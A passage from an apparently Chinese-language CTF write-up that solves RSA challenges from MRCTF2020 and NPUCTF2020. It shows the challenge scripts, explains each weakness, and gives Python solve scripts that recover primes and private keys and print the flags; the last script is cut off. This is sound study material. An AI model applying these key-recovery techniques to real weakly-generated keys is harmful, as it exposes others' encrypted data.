n)</code>，只要求出来n与d即可，前面给出的<code>P_p</code>提示即可求出来所有的元素，从而可以获得p。</p><p>​    编写解密脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesbase <span class="token operator">=</span> <span class="token number">65537</span>P_p <span class="token operator">=</span> <span class="token number">206027926847308612719677572554991143421</span>P_factor <span class="token operator">=</span> <span class="token number">213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span>Q_1 <span class="token operator">=</span> <span class="token number">103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span>Q_2 <span class="token operator">=</span> <span class="token number">151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span>sub_Q <span class="token operator">=</span> <span class="token number">168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span>Ciphertext <span class="token operator">=</span>  <span class="token number">1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span><span class="token comment"># 求q</span>Q <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>sub_Q<span class="token punctuation">,</span> Q_2<span class="token punctuation">,</span> Q_1<span class="token punctuation">)</span> <span class="token comment"># sub_Q ** Q_2 % Q_1</span>q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token comment"># 求p</span>P <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">]</span>P<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> P_p<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    P<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>prevprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span><span class="token number">9</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># prevprime是求当前素数的前面一个素数的函数</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>_n <span class="token operator">=</span> <span class="token number">1</span>_phi <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    _n <span class="token operator">*=</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    _phi <span class="token operator">*=</span> <span class="token punctuation">(</span>P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>_d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>base<span class="token punctuation">,</span> _phi<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>P_factor<span class="token punctuation">,</span> _d<span class="token punctuation">,</span> _n<span class="token punctuation">)</span>p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token comment"># 解密</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>base<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>Ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'MRCTF&#123;sti11_@_b@by_qu3st10n&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NPUCTF2020-EzRSA"><a href="#NPUCTF2020-EzRSA" class="headerlink" title="[NPUCTF2020]EzRSA"></a>[NPUCTF2020]EzRSA</h4><p><strong>TAG：给出p-1、q-1的最小公倍数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> lcm<span class="token punctuation">,</span> powmod<span class="token punctuation">,</span> invert<span class="token punctuation">,</span> gcd<span class="token punctuation">,</span> mpz<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token keyword">from</span> sympy <span class="token keyword">import</span> nextprime<span class="token keyword">from</span> random <span class="token keyword">import</span> randintp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qgift <span class="token operator">=</span> lcm<span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">54722</span>flag <span class="token operator">=</span> <span class="token string">b'NPUCTF&#123;******************&#125;'</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>c <span class="token operator">=</span> powmod<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n: '</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'gift: '</span><span class="token punctuation">,</span> gift<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c: '</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""n = 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121gift = 2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104c = 3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出的gift可以看到是非常接近于n的，而这个最小公倍数的最大值为<code>(p-1)*(q-1)</code>，是不可能比n更大的，所以这里我们可以尝试对<code>(p-1)*(q-1)</code>也就是<code>phi</code>进行爆破，下面写出解题脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> lcm<span class="token punctuation">,</span> powmod<span class="token punctuation">,</span> invert<span class="token punctuation">,</span> gcd<span class="token punctuation">,</span> mpz<span class="token punctuation">,</span> isqrt<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">from</span> sympy <span class="token keyword">import</span> nextprime<span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token triple-quoted-string string">"""p = getPrime(1024)q = getPrime(1024)n = p * qgift = lcm(p - 1, q - 1)e = 54722flag = b'NPUCTF&#123;******************&#125;'m = int.from_bytes(flag, 'big')c = powmod(m, e, n)print('n: ', n)print('gift: ', gift)print('c: ', c)"""</span>n <span class="token operator">=</span> <span class="token number">17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span>gift <span class="token operator">=</span> <span class="token number">2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104</span>c <span class="token operator">=</span> <span class="token number">3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319</span>e <span class="token operator">=</span> <span class="token number">54722</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>gift<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    phi <span class="token operator">=</span> gift <span class="token operator">*</span> i    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>        flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>isqrt<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span class="token comment"># b'NPUCTF&#123;diff1cult_rsa_1s_e@sy&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个范围<code>[4, 8]</code>的原因是gift是2045bit，phi是2048位。而phi = lcm <em> gcd，`乘积(2048)=最小公倍数(2045)</em>最大公约数(3)<code>。故gcd的值为三个比特位，即</code>[4, 8]`。</p><p>而e不是素数，无法求出invert，这里把<code>e//2</code>，再将<code>m开平方</code>即可。</p><h4 id="MRCTF2020-Easy-RSA"><a href="#MRCTF2020-Easy-RSA" class="headerlink" title="[MRCTF2020]Easy_RSA"></a>[MRCTF2020]Easy_RSA</h4><p>给出的加密脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> gcd<span class="token punctuation">,</span> invert<span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> isPrime<span class="token punctuation">,</span> getRandomNBitInteger<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">import</span> base64<span class="token keyword">from</span> zlib <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token string">b"MRCTF&#123;XXXX&#125;"</span>base <span class="token operator">=</span> <span class="token number">65537</span><span class="token keyword">def</span> <span class="token function">gen_prime</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>    A <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        A <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>N<span class="token punctuation">)</span>        <span class="token keyword">if</span> A <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> A<span class="token keyword">def</span> <span class="token function">gen_p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> q<span class="token punctuation">)</span>    n <span class="token operator">=</span> p <span class="token operator">*</span> q    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_n = "</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>    F_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_F_n = "</span><span class="token punctuation">,</span> F_n<span class="token punctuation">)</span>    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">2020</span> <span class="token operator">*</span> q    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> q<span class="token punctuation">)</span>    n <span class="token operator">=</span> p <span class="token operator">*</span> q    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_n = "</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>    e <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span>    F_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> F_n<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> F_n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_E_D = "</span><span class="token punctuation">,</span> e <span class="token operator">*</span> d<span class="token punctuation">)</span>    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">-</span> <span class="token number">2020</span> <span class="token operator">*</span> q    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    _E <span class="token operator">=</span> base    _P <span class="token operator">=</span> gen_p<span class="token punctuation">(</span><span class="token punctuation">)</span>    _Q <span class="token operator">=</span> gen_q<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span>gcd<span class="token punctuation">(</span>_E<span class="token punctuation">,</span> <span class="token punctuation">(</span>_P <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>_Q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    _M <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    _C <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>_M<span class="token punctuation">,</span> _E<span class="token punctuation">,</span> _P <span class="token operator">*</span> _Q<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Ciphertext = "</span><span class="token punctuation">,</span> _C<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''P_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693P_F_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740Q_n =  20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947Q_E_D =  100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201Ciphertext =  40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里用到了有<code>e*d</code>和<code>n</code>求<code>phi</code>、有<code>phi</code>和<code>n</code>如何求<code>p、q</code>。注意，p和q的大小的问题。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesP_n <span class="token operator">=</span>  <span class="token number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693</span>P_F_n <span class="token operator">=</span>  <span class="token number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740</span>Q_n <span class="token operator">=</span>  <span class="token number">20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947</span>Q_E_D <span class="token operator">=</span>  <span class="token number">100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201</span>Ciphertext <span class="token operator">=</span>  <span class="token number">40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021</span>e <span class="token operator">=</span> <span class="token number">65537</span><span class="token keyword">def</span> <span class="token function">solve_p</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp1 <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># =p+q</span>    tmp2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> n<span class="token punctuation">)</span>  <span class="token comment"># =p-q</span>    q <span class="token operator">=</span> <span class="token punctuation">(</span>tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    p <span class="token operator">=</span> n <span class="token operator">//</span> q    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">2020</span> <span class="token operator">*</span> q    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">solve_q</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp1 <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># =p+q</span>    tmp2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> n<span class="token punctuation">)</span>  <span class="token comment"># =p-q</span>    q <span class="token operator">=</span> <span class="token punctuation">(</span>tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    p <span class="token operator">=</span> n <span class="token operator">//</span> q    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">-</span> <span class="token number">2020</span> <span class="token operator">*</span> q    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token 